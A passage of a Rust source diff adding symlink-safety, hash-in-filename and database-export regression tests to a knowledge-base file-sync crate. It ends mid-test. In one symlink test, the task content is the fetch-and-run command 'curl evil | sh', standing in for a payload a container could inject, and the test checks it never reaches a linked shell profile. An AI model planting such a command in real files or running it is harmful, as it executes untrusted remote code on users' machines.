@@ -15,6 +15,14 @@ use jkb_sync::{sync, sync_paths, Outcome};
 use jkb_types::{ConflictPolicy, SyncMode};
 use rusqlite::OptionalExtension;
 
+/// A temporary directory at its canonical path. `jkb mount create` stores a mount's directory
+/// canonical and sync refuses a path through a symlink (`jkb_core::nofollow`), so a test mounting a
+/// raw temp path — `/var/folders/…` on macOS, where `/var` is a link — would be refused for a reason
+/// real mounts never meet.
+fn real_tempdir() -> tempfile::TempDir {
+    tempfile::tempdir_in(std::fs::canonicalize(std::env::temp_dir()).unwrap()).unwrap()
+}
+
 /// Create a `file://` mount at `ns_path` backing `dir`.
 #[allow(clippy::too_many_arguments)]
 fn mount_dir(
@@ -96,7 +104,7 @@ fn kb_edit(db: &Db, uri: &str, content: &str) {
 
 #[test]
 fn readme_imports_then_round_trips_both_ways() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("README.md");
     fs::write(&file, "hello").unwrap();
     let uri = uri_for(&file);
@@ -141,7 +149,7 @@ fn readme_imports_then_round_trips_both_ways() {
 
 #[test]
 fn excluded_files_are_not_synced() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     fs::write(dir.path().join("keep.md"), "keep me").unwrap();
     fs::write(dir.path().join("secret.env"), "nope").unwrap();
 
@@ -165,7 +173,7 @@ fn excluded_files_are_not_synced() {
 
 #[test]
 fn both_changed_conflict_is_reported_under_manual() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("README.md");
     fs::write(&file, "base").unwrap();
     let uri = uri_for(&file);
@@ -196,7 +204,7 @@ fn both_changed_conflict_is_reported_under_manual() {
 
 #[test]
 fn both_changed_disk_wins_imports_the_disk_copy() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("README.md");
     fs::write(&file, "base").unwrap();
     let uri = uri_for(&file);
@@ -227,7 +235,7 @@ fn both_changed_disk_wins_imports_the_disk_copy() {
 
 #[test]
 fn failed_import_does_not_corrupt_sync_state() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("README.md");
     fs::write(&file, "valid text").unwrap();
     let uri = uri_for(&file);
@@ -271,7 +279,7 @@ fn failed_import_does_not_corrupt_sync_state() {
 
 #[test]
 fn unknown_serializer_is_rejected() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     fs::write(dir.path().join("a.md"), "x").unwrap();
 
     let db = Db::open_in_memory().unwrap();
@@ -292,7 +300,7 @@ fn unknown_serializer_is_rejected() {
 
 #[test]
 fn sync_paths_reconciles_only_the_named_files() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let a = dir.path().join("a.md");
     let b = dir.path().join("b.md");
     fs::write(&a, "a1").unwrap();
@@ -324,7 +332,7 @@ fn sync_paths_reconciles_only_the_named_files() {
 
 #[test]
 fn sync_paths_drops_paths_outside_scope() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let keep = dir.path().join("keep.md");
     fs::write(&keep, "keep").unwrap();
     fs::write(dir.path().join("skip.env"), "skip").unwrap();
@@ -357,7 +365,7 @@ fn sync_paths_drops_paths_outside_scope() {
 
 #[test]
 fn watch_runs_an_initial_reconcile_then_stops() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("README.md");
     fs::write(&file, "watch me").unwrap();
 
@@ -387,8 +395,8 @@ fn watch_runs_an_initial_reconcile_then_stops() {
 #[test]
 fn watch_all_reconciles_every_mount_then_stops() {
     let db = Db::open_in_memory().unwrap();
-    let repo_a = tempfile::tempdir().unwrap();
-    let repo_b = tempfile::tempdir().unwrap();
+    let repo_a = real_tempdir();
+    let repo_b = real_tempdir();
     fs::write(repo_a.path().join("a.md"), "alpha").unwrap();
     fs::write(repo_b.path().join("b.md"), "beta").unwrap();
 
@@ -500,7 +508,7 @@ fn mount_tasks(db: &Db, dir: &Path, policy: ConflictPolicy) {
 
 #[test]
 fn tasks_import_creates_items_sections_and_is_byte_stable() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     fs::write(&file, TASKS_MD).unwrap();
     let uri = uri_for(&file);
@@ -555,7 +563,7 @@ fn is_blocked(db: &Db, uid: &str) -> bool {
 
 #[test]
 fn kb_edit_exports_and_preserves_structure() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     fs::write(&file, TASKS_MD).unwrap();
     let uri = uri_for(&file);
@@ -579,7 +587,7 @@ fn kb_edit_exports_and_preserves_structure() {
 
 #[test]
 fn caret_less_task_is_stamped_back_to_disk() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     fs::write(&file, "- [ ] a fresh task\n").unwrap();
 
@@ -596,7 +604,7 @@ fn caret_less_task_is_stamped_back_to_disk() {
 
 #[test]
 fn removing_a_task_line_cancels_the_item() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     fs::write(&file, TASKS_MD).unwrap();
     let uri = uri_for(&file);
@@ -623,7 +631,7 @@ fn removing_a_task_line_cancels_the_item() {
 
 #[test]
 fn disjoint_disk_and_kb_edits_merge_three_way() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     fs::write(&file, TASKS_MD).unwrap();
     let uri = uri_for(&file);
@@ -656,7 +664,7 @@ fn disjoint_disk_and_kb_edits_merge_three_way() {
 
 #[test]
 fn same_task_edited_both_sides_conflicts_under_manual() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     fs::write(&file, TASKS_MD).unwrap();
     let uri = uri_for(&file);
@@ -688,7 +696,7 @@ fn same_task_edited_both_sides_conflicts_under_manual() {
 
 #[test]
 fn malformed_file_is_quarantined_then_recovers() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     fs::write(&file, TASKS_MD).unwrap();
     let uri = uri_for(&file);
@@ -742,7 +750,7 @@ fn disk_reindent_survives_a_three_way_merge() {
     // Regression: a re-parenting (indentation) edit on disk is a `parent_of` change, which
     // the merge signature must capture — otherwise a both-sides-changed merge silently
     // reverts it (the child's `Sig` looks identical and the edge is taken from `base`).
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     fs::write(&file, TASKS_MD).unwrap();
     let uri = uri_for(&file);
@@ -803,7 +811,7 @@ fn disk_reindent_survives_a_three_way_merge() {
 /// stale header was written back over it.
 #[test]
 fn prose_is_not_an_item_so_a_section_cannot_outlive_the_file() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     fs::write(
         &file,
@@ -876,7 +884,7 @@ fn prose_is_not_an_item_so_a_section_cannot_outlive_the_file() {
 /// so a plain insert hit `UNIQUE constraint failed: items.uid` and the whole sync errored.
 #[test]
 fn re_adding_a_deleted_task_line_reattaches_the_same_item() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     fs::write(
         &file,
@@ -932,7 +940,7 @@ fn id_of(db: &Db, uid: &str) -> i64 {
 /// and paragraph out of a merged file (it destroyed a real openspec document).
 #[test]
 fn a_three_way_merge_keeps_the_files_prose() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     fs::write(
         &file,
@@ -1025,7 +1033,7 @@ fn headers_mid_item(text: &str) -> Vec<&str> {
 /// three-way merge.
 #[test]
 fn document_order_survives_kb_side_changes_and_merges() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     let source = "# Plan\n\nIntro prose.\n\n## Alpha\n\n- [ ] first ^first\n  the first body\n  a second body line\n- [ ] second ^second\n\n## Beta\n\nSection prose.\n\n- [ ] third ^third\n  the third body\n";
     fs::write(&file, source).unwrap();
@@ -1140,7 +1148,7 @@ fn document_order_survives_kb_side_changes_and_merges() {
 /// wrote (non-canonical for today's), while the KB's content is untouched.
 #[test]
 fn a_renderer_change_is_not_mistaken_for_a_content_change() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     // The renderer emits modifiers in a canonical order (priority, due, tags, ...), so the
     // same document written with them in another order is byte-different but identical in
@@ -1225,7 +1233,7 @@ fn a_renderer_change_is_not_mistaken_for_a_content_change() {
 /// every future sync. The document must be unchanged — only its formatting.
 #[test]
 fn a_non_canonical_file_is_normalized_once_then_fast_paths() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     // Canonical modifier order is priority, due, tags. Written the other way round, this is
     // the same document rendered differently.
@@ -1304,7 +1312,7 @@ fn a_non_canonical_file_is_normalized_once_then_fast_paths() {
 /// Giving each file its own namespace means there is nothing to answer.
 #[test]
 fn two_tasks_files_in_one_directory_each_keep_their_own_document() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let tasks = dir.path().join("tasks.md");
     let design = dir.path().join("design.md");
     fs::write(&tasks, "## Plan\n\n- [ ] ship it !p1\n").unwrap();
@@ -1352,7 +1360,7 @@ fn two_tasks_files_in_one_directory_each_keep_their_own_document() {
 /// a guard, and is asserted directly so a future change to `namespace_for` fails here.
 #[test]
 fn deleting_a_sibling_never_overwrites_the_survivor() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let tasks = dir.path().join("tasks.md");
     let design = dir.path().join("design.md");
     fs::write(&tasks, "## Plan\n\n- [ ] ship it !p1\n").unwrap();
@@ -1381,7 +1389,7 @@ fn deleting_a_sibling_never_overwrites_the_survivor() {
 /// once from the file's own base blob, and the run after that is an ordinary no-op (D45.6).
 #[test]
 fn a_legacy_journal_row_is_populated_once_from_its_own_base() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let tasks = dir.path().join("tasks.md");
     fs::write(&tasks, "## Plan\n\nSome prose.\n\n- [ ] ship it !p1\n").unwrap();
 
@@ -1427,7 +1435,7 @@ fn a_legacy_journal_row_is_populated_once_from_its_own_base() {
 /// now lives on the journal row, keyed by the file's uri, so the namespace tree cannot reach it.
 #[test]
 fn renaming_a_files_namespace_does_not_strip_the_file() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let tasks = dir.path().join("tasks.md");
     fs::write(
         &tasks,
@@ -1461,7 +1469,7 @@ fn renaming_a_files_namespace_does_not_strip_the_file() {
 /// writes that render over the file — so `jkb undo` after a re-home silently deletes task lines.
 #[test]
 fn an_export_refuses_when_a_bound_items_line_would_vanish() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let tasks = dir.path().join("tasks.md");
     fs::write(&tasks, "## Plan\n\n- [ ] keep me !p1\n- [ ] and me !p2\n").unwrap();
 
@@ -1512,7 +1520,7 @@ fn an_export_refuses_when_a_bound_items_line_would_vanish() {
 /// A legitimate KB-only edit still exports — the guard must not block the ordinary path.
 #[test]
 fn a_kb_only_status_change_still_exports() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let tasks = dir.path().join("tasks.md");
     fs::write(&tasks, "## Plan\n\n- [ ] ship it !p1\n").unwrap();
 
@@ -1547,7 +1555,7 @@ fn a_kb_only_status_change_still_exports() {
 /// bug in this subsystem grew out of.
 #[test]
 fn undoing_a_sync_rewinds_structure_with_the_hashes() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let tasks = dir.path().join("tasks.md");
     fs::write(&tasks, "## One\n\n- [ ] first !p1\n").unwrap();
 
@@ -1592,7 +1600,7 @@ fn undoing_a_sync_rewinds_structure_with_the_hashes() {
 /// property does NOT cover (D45.4), so it is asserted on bytes rather than assumed.
 #[test]
 fn kb_wins_over_a_structurally_changed_disk_keeps_the_items() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let tasks = dir.path().join("tasks.md");
     fs::write(&tasks, "## Plan\n\n- [ ] shared !p1\n").unwrap();
 
@@ -1635,7 +1643,7 @@ fn kb_wins_over_a_structurally_changed_disk_keeps_the_items() {
 /// `write_file` dropped its line. The tool's instructions were the exploit.
 #[test]
 fn editing_a_refused_file_does_not_delete_the_protected_line() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let tasks = dir.path().join("tasks.md");
     fs::write(&tasks, "## Plan\n\n- [ ] keep me !p1\n- [ ] and me !p2\n").unwrap();
 
@@ -1726,7 +1734,7 @@ fn editing_a_refused_file_does_not_delete_the_protected_line() {
 /// re-keying it from `header_line` to `sync_section` risked.
 #[test]
 fn a_section_the_file_drops_stops_being_a_section() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let tasks = dir.path().join("tasks.md");
     fs::write(&tasks, "## Keep\n\n- [ ] a !p1\n\n## Drop\n\n- [ ] b !p2\n").unwrap();
 
@@ -1769,7 +1777,7 @@ fn a_section_the_file_drops_stops_being_a_section() {
 /// own committed transaction, before anything can write.
 #[test]
 fn what_a_sync_overwrites_is_recoverable_from_the_archive() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let tasks = dir.path().join("tasks.md");
     fs::write(&tasks, "## Plan\n\n- [ ] first !p1\n").unwrap();
 
@@ -1815,7 +1823,7 @@ fn what_a_sync_overwrites_is_recoverable_from_the_archive() {
 fn a_file_whose_bytes_cannot_be_archived_is_not_overwritten() {
     use std::os::unix::fs::PermissionsExt;
 
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let tasks = dir.path().join("tasks.md");
     fs::write(&tasks, "## Plan\n\n- [ ] ship it !p1\n").unwrap();
 
@@ -1866,7 +1874,7 @@ fn a_file_whose_bytes_cannot_be_archived_is_not_overwritten() {
 /// something false about why.
 #[test]
 fn an_export_only_mount_overwrites_a_file_it_has_never_imported() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("note.md");
     fs::write(&file, "stale bytes on disk").unwrap();
     let uri = uri_for(&file);
@@ -1950,7 +1958,7 @@ fn kb_status(db: &Db, uid: &str) -> Option<String> {
 /// mount's whole contract is that the KB is authoritative and the file is an output.
 #[test]
 fn an_export_only_mount_never_cancels_a_task_a_disk_edit_removed() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     fs::write(&file, TASKS_MD).unwrap();
     let uri = uri_for(&file);
@@ -2013,7 +2021,7 @@ fn an_export_only_mount_never_cancels_a_task_a_disk_edit_removed() {
 /// arm, and writes an item-less render over the file. Undo is supposed to give work back.
 #[test]
 fn undoing_a_sync_then_re_syncing_does_not_strip_the_file() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     fs::write(&file, TASKS_MD).unwrap();
 
@@ -2107,7 +2115,7 @@ fn mount_mode(db: &Db, dir: &Path, mode: SyncMode) {
 
 /// Drive one cell and return what the file looked like before and after the sync under test.
 fn matrix_case(mode: SyncMode, stage: Stage) -> (jkb_sync::SyncReport, String, String, i64) {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     fs::write(&file, TASKS_MD).unwrap();
     let uri = uri_for(&file);
@@ -2289,7 +2297,7 @@ fn an_export_only_mount_refuses_to_export_an_emptied_kb_over_a_populated_file() 
 #[test]
 fn a_document_mount_recovers_an_emptied_kb_and_refuses_when_it_cannot() {
     for mode in [SyncMode::Bidirectional, SyncMode::Export] {
-        let dir = tempfile::tempdir().unwrap();
+        let dir = real_tempdir();
         let file = dir.path().join("README.md");
         fs::write(&file, "the good copy\n").unwrap();
         let uri = uri_for(&file);
@@ -2361,7 +2369,7 @@ fn a_document_mount_recovers_an_emptied_kb_and_refuses_when_it_cannot() {
 /// `kb_wins` silently not honoured and has to guess whether that was meant.
 #[test]
 fn wholesale_loss_recovers_even_under_kb_wins() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     fs::write(&file, TASKS_MD).unwrap();
 
@@ -2423,7 +2431,7 @@ fn wholesale_loss_recovers_even_under_kb_wins() {
 #[test]
 fn a_bound_item_that_lost_its_placement_is_refused_not_re_imported() {
     for mode in [SyncMode::Bidirectional, SyncMode::Import, SyncMode::Export] {
-        let dir = tempfile::tempdir().unwrap();
+        let dir = real_tempdir();
         let file = dir.path().join("README.md");
         fs::write(&file, "on disk\n").unwrap();
         let uri = uri_for(&file);
@@ -2534,7 +2542,7 @@ const TASKS_WITH_BASE: &str = "\
 /// document still treats the facet specially.
 #[test]
 fn a_cut_point_modifier_in_a_file_is_an_ordinary_tag_and_the_file_settles() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     fs::write(&file, TASKS_WITH_BASE).unwrap();
     let uri = uri_for(&file);
@@ -2577,7 +2585,7 @@ fn a_cut_point_modifier_in_a_file_is_an_ordinary_tag_and_the_file_settles() {
 /// the facet has to come through it.
 #[test]
 fn editing_a_line_that_carries_a_cut_point_modifier_keeps_it() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     fs::write(&file, TASKS_WITH_BASE).unwrap();
     let uri = uri_for(&file);
@@ -2604,4 +2612,630 @@ fn editing_a_line_that_carries_a_cut_point_modifier_keeps_it() {
             .any(|(f, _)| f == "base"),
         "the modifier was dropped by the reconcile"
     );
+}
+
+/// A bound file replaced by a symlink — which a dev container can plant inside a directory it binds —
+/// is neither read through nor written through, however the knowledge base has changed: the file the
+/// link points at is left exactly as it was (`jkb_core::nofollow`).
+#[cfg(unix)]
+#[test]
+fn sync_never_writes_through_a_symlink_planted_at_a_bound_file() {
+    let dir = real_tempdir();
+    let outside = real_tempdir();
+    let file = dir.path().join("tasks.md");
+    fs::write(&file, TASKS_MD).unwrap();
+    let uri = uri_for(&file);
+    let db = Db::open_in_memory().unwrap();
+    mount_tasks(&db, dir.path(), ConflictPolicy::Manual);
+    sync(&db, "docs/plan").unwrap();
+
+    // The knowledge base changes the task — as a container's `task.edit` through `jkb serve` would.
+    let fix = format!("{uri}#fix");
+    db.write_txn("t", move |conn, meta| {
+        let id = item::id_for_uid(conn, &fix)?.expect("task");
+        item::set_content(conn, meta, id, "curl evil | sh", None)
+    })
+    .unwrap();
+    // And the bound file is swapped for a link to a file outside the mount.
+    let target = outside.path().join("zshrc");
+    fs::write(&target, TASKS_MD).unwrap();
+    fs::remove_file(&file).unwrap();
+    std::os::unix::fs::symlink(&target, &file).unwrap();
+
+    let _ = sync(&db, "docs/plan");
+    assert_eq!(
+        fs::read_to_string(&target).unwrap(),
+        TASKS_MD,
+        "the link's target was not written"
+    );
+    assert!(
+        fs::symlink_metadata(&file)
+            .unwrap()
+            .file_type()
+            .is_symlink(),
+        "and the link was not replaced by a render either"
+    );
+}
+
+/// A bound file whose directory is swapped for a link is refused and the refusal kept on its journal
+/// row — never skipped as out of scope, which settled the row to `ok` and stopped the file syncing
+/// with nothing reported.
+#[cfg(unix)]
+#[test]
+fn a_bound_file_reached_through_a_link_stays_flagged_naming_the_link() {
+    let dir = real_tempdir();
+    fs::create_dir_all(dir.path().join("sub")).unwrap();
+    let file = dir.path().join("sub/tasks.md");
+    fs::write(&file, TASKS_MD).unwrap();
+    let uri = uri_for(&file);
+    let db = Db::open_in_memory().unwrap();
+    mount_tasks(&db, dir.path(), ConflictPolicy::Manual);
+    sync(&db, "docs/plan").unwrap();
+
+    kb_set_status(&db, &format!("{uri}#setup"), "done");
+    fs::rename(dir.path().join("sub"), dir.path().join("sub.real")).unwrap();
+    std::os::unix::fs::symlink(dir.path().join("sub.real"), dir.path().join("sub")).unwrap();
+
+    for pass in 0..2 {
+        let report = sync(&db, "docs/plan").unwrap();
+        let refused = report
+            .results
+            .iter()
+            .find(|f| f.path == file)
+            .unwrap_or_else(|| panic!("pass {pass}: the bound file is reconciled: {report:?}"));
+        assert_eq!(refused.outcome, Outcome::Failed, "pass {pass}: {report:?}");
+        assert!(
+            refused
+                .reason
+                .as_deref()
+                .is_some_and(|r| r.contains("symbolic link")),
+            "pass {pass}: {refused:?}"
+        );
+        assert_eq!(
+            journal(&db, &uri).map(|(status, _)| status).as_deref(),
+            Some("needs_attention"),
+            "pass {pass}: still flagged"
+        );
+    }
+    assert_eq!(
+        fs::read_to_string(dir.path().join("sub.real/tasks.md")).unwrap(),
+        TASKS_MD,
+        "nothing written through the link"
+    );
+}
+
+/// An interrupted write's temporary file is never imported as a second copy of the file, and a
+/// directory reached through a link below the mount is not taken up.
+#[cfg(unix)]
+#[test]
+fn sync_skips_its_own_temp_files_and_paths_through_a_link() {
+    let dir = real_tempdir();
+    let outside = real_tempdir();
+    fs::write(dir.path().join("tasks.md"), TASKS_MD).unwrap();
+    fs::write(dir.path().join(".tasks.md.jkb-sync-1-2.tmp"), TASKS_MD).unwrap();
+    fs::create_dir_all(outside.path().join("elsewhere")).unwrap();
+    fs::write(outside.path().join("elsewhere/tasks.md"), TASKS_MD).unwrap();
+    std::os::unix::fs::symlink(outside.path(), dir.path().join("linked")).unwrap();
+    let db = Db::open_in_memory().unwrap();
+    mount_dir(
+        &db,
+        "docs/plan",
+        dir.path(),
+        SyncMode::Bidirectional,
+        "tasks",
+        None,
+        None,
+        ConflictPolicy::Manual,
+    );
+    sync(&db, "docs/plan").unwrap();
+    assert_eq!(
+        task_count(&db),
+        3,
+        "one file's tasks, not the temp copy's or the linked tree's"
+    );
+    let report = sync_paths(
+        &db,
+        "docs/plan",
+        &[dir.path().join("linked/elsewhere/tasks.md")],
+    )
+    .unwrap();
+    assert_eq!(
+        report.count(Outcome::Created),
+        0,
+        "an event through the link is not taken up"
+    );
+    assert_eq!(task_count(&db), 3);
+    assert!(
+        journal(&db, &uri_for(&dir.path().join("linked/elsewhere/tasks.md"))).is_none(),
+        "not even reconciled far enough to be journalled as needing attention"
+    );
+}
+
+/// A document whose own name has a `#` in it is one file, not a file named up to the `#` with a
+/// fragment: splitting `C#.md` there had the second sync export the note to a new file `C`.
+#[test]
+fn a_document_named_with_a_hash_syncs_as_itself() {
+    let dir = real_tempdir();
+    let file = dir.path().join("C#.md");
+    fs::write(&file, "notes on C#").unwrap();
+    let db = Db::open_in_memory().unwrap();
+    mount_dir(
+        &db,
+        "docs/notes",
+        dir.path(),
+        SyncMode::Bidirectional,
+        "document",
+        None,
+        None,
+        ConflictPolicy::Manual,
+    );
+    assert_eq!(sync(&db, "docs/notes").unwrap().count(Outcome::Created), 1);
+    let report = sync(&db, "docs/notes").unwrap();
+    assert_eq!(report.count(Outcome::UpToDate), 1, "{report:?}");
+    assert_eq!(report.count(Outcome::Exported), 0, "{report:?}");
+    assert!(
+        report.results.iter().all(|r| r.path == file),
+        "no file `C` is even visited: {report:?}"
+    );
+    assert!(!dir.path().join("C").exists(), "no stray file `C`");
+    kb_edit(&db, &uri_for(&file), "edited in kb");
+    assert_eq!(sync(&db, "docs/notes").unwrap().count(Outcome::Exported), 1);
+    assert_eq!(fs::read_to_string(&file).unwrap(), "edited in kb");
+    assert!(!dir.path().join("C").exists());
+}
+
+/// A dotless name spelled like a fragment (`issue#42`) is one file once it is synced: the journal row
+/// written with its first binding says so, where spelling alone read it as the file `issue`.
+#[test]
+fn a_dotless_document_named_with_a_hash_syncs_as_itself() {
+    let dir = real_tempdir();
+    let file = dir.path().join("issue#42");
+    fs::write(&file, "the bug").unwrap();
+    let db = Db::open_in_memory().unwrap();
+    mount_dir(
+        &db,
+        "docs/notes",
+        dir.path(),
+        SyncMode::Bidirectional,
+        "document",
+        None,
+        None,
+        ConflictPolicy::Manual,
+    );
+    assert_eq!(sync(&db, "docs/notes").unwrap().count(Outcome::Created), 1);
+    let report = sync(&db, "docs/notes").unwrap();
+    assert!(
+        report.results.iter().all(|r| r.path == file),
+        "no file `issue` is visited: {report:?}"
+    );
+    kb_edit(&db, &uri_for(&file), "edited in kb");
+    assert_eq!(sync(&db, "docs/notes").unwrap().count(Outcome::Exported), 1);
+    assert_eq!(fs::read_to_string(&file).unwrap(), "edited in kb");
+    assert!(!dir.path().join("issue").exists(), "no stray file `issue`");
+}
+
+/// An unbound file flagged on its first sync, whose directory is then replaced by a link, is out of
+/// scope for the sweep as it is for discovery — kept in scope, its flag could never clear.
+#[cfg(unix)]
+#[test]
+fn a_flagged_unbound_file_behind_a_link_is_settled() {
+    let dir = real_tempdir();
+    fs::create_dir_all(dir.path().join("sub")).unwrap();
+    let file = dir.path().join("sub/tasks.md");
+    fs::write(&file, "## Backend\n- [ ] one ^dup\n- [ ] two ^dup\n").unwrap();
+    let uri = uri_for(&file);
+    let db = Db::open_in_memory().unwrap();
+    mount_tasks(&db, dir.path(), ConflictPolicy::Manual);
+    assert_eq!(
+        sync(&db, "docs/plan").unwrap().count(Outcome::Quarantined),
+        1
+    );
+    assert_eq!(journal(&db, &uri).unwrap().0, "needs_attention");
+
+    fs::rename(dir.path().join("sub"), dir.path().join("sub.real")).unwrap();
+    std::os::unix::fs::symlink(dir.path().join("sub.real"), dir.path().join("sub")).unwrap();
+    sync(&db, "docs/plan").unwrap();
+    assert_eq!(
+        journal(&db, &uri).unwrap().0,
+        "ok",
+        "the row behind the link is settled"
+    );
+}
+
+/// A task changed in the database — not in its file — is written to its file by the next pass over
+/// what changed there, and only that file: nothing else touched is reconciled, and a second pass finds
+/// nothing.
+#[test]
+fn a_database_edit_is_exported_to_its_file_and_to_no_other() {
+    let dir = real_tempdir();
+    fs::create_dir_all(dir.path().join("a")).unwrap();
+    fs::create_dir_all(dir.path().join("b")).unwrap();
+    let edited = dir.path().join("a/tasks.md");
+    let untouched = dir.path().join("b/tasks.md");
+    fs::write(&edited, TASKS_MD).unwrap();
+    fs::write(&untouched, "## Other\n- [ ] Leave me be ^leave\n").unwrap();
+    let db = Db::open_in_memory().unwrap();
+    let mut judged = jkb_sync::FlaggedJudgements::default();
+    mount_tasks(&db, dir.path(), ConflictPolicy::Manual);
+    sync(&db, "docs/plan").unwrap();
+    assert!(
+        jkb_sync::sync_kb_changes(&db, "docs/plan", &mut judged)
+            .unwrap()
+            .results
+            .is_empty(),
+        "nothing changed yet"
+    );
+
+    kb_set_status(&db, &format!("{}#setup", uri_for(&edited)), "done");
+    let report = jkb_sync::sync_kb_changes(&db, "docs/plan", &mut judged).unwrap();
+    assert_eq!(report.results.len(), 1, "{report:?}");
+    assert_eq!(report.results[0].path, edited);
+    assert_eq!(report.count(Outcome::Exported), 1, "{report:?}");
+    assert!(fs::read_to_string(&edited)
+        .unwrap()
+        .contains("- [x] Set up CI ^setup"));
+    assert!(
+        jkb_sync::sync_kb_changes(&db, "docs/plan", &mut judged)
+            .unwrap()
+            .results
+            .is_empty(),
+        "settled"
+    );
+
+    // A flagged file is left to the reconcile that settles its flag: broken on disk, then edited in the
+    // database, it is not rewritten from here.
+    fs::write(&untouched, "## Other\n- [ ] one ^dup\n- [ ] two ^dup\n").unwrap();
+    sync(&db, "docs/plan").unwrap();
+    assert_eq!(
+        journal(&db, &uri_for(&untouched)).unwrap().0,
+        "needs_attention"
+    );
+    kb_set_status(&db, &format!("{}#leave", uri_for(&untouched)), "done");
+    assert!(
+        jkb_sync::sync_kb_changes(&db, "docs/plan", &mut judged)
+            .unwrap()
+            .results
+            .is_empty(),
+        "a flagged file is not reconciled by a database change"
+    );
+    assert!(fs::read_to_string(&untouched).unwrap().contains("^dup"));
+}
+
+/// The watcher writes a database edit to its file with no filesystem event to prompt it: a task edited
+/// through `jkb` on the host, or by a container through `jkb serve`, used to stay out of its file until
+/// the file changed on disk or the watcher restarted.
+#[test]
+fn the_watcher_exports_a_database_edit_without_a_file_event() {
+    let dir = real_tempdir();
+    let file = dir.path().join("tasks.md");
+    fs::write(&file, TASKS_MD).unwrap();
+    let db = Db::open_in_memory().unwrap();
+    mount_tasks(&db, dir.path(), ConflictPolicy::Manual);
+    let stop = Arc::new(AtomicBool::new(false));
+    let watcher = {
+        let db = db.clone();
+        let stop = Arc::clone(&stop);
+        std::thread::spawn(move || {
+            jkb_sync::watch(&db, "docs/plan", Duration::from_millis(20), &stop)
+        })
+    };
+    let uri = format!("{}#setup", uri_for(&file));
+    let deadline = std::time::Instant::now() + Duration::from_secs(10);
+    while status_of(&db, &uri).is_none() {
+        assert!(std::time::Instant::now() < deadline, "initial reconcile");
+        std::thread::sleep(Duration::from_millis(20));
+    }
+    // And files under the mount changing faster than the debounce the whole time — a build, git, a task
+    // worktree — which the mount's globs exclude but whose events still arrive: asked only when the
+    // filesystem went quiet, the database never was.
+    let churning = Arc::new(AtomicBool::new(true));
+    let churn = {
+        let noise = dir.path().join("build.log");
+        let churning = Arc::clone(&churning);
+        std::thread::spawn(move || {
+            let mut n = 0_u64;
+            while churning.load(std::sync::atomic::Ordering::Relaxed) {
+                n += 1;
+                fs::write(&noise, n.to_string()).unwrap();
+                std::thread::sleep(Duration::from_millis(5));
+            }
+        })
+    };
+    // Well under way before the edit, so the watcher is already inside the churn when it lands.
+    std::thread::sleep(Duration::from_millis(300));
+
+    kb_set_status(&db, &uri, "done");
+    let deadline = std::time::Instant::now() + Duration::from_secs(10);
+    while !fs::read_to_string(&file)
+        .unwrap()
+        .contains("- [x] Set up CI ^setup")
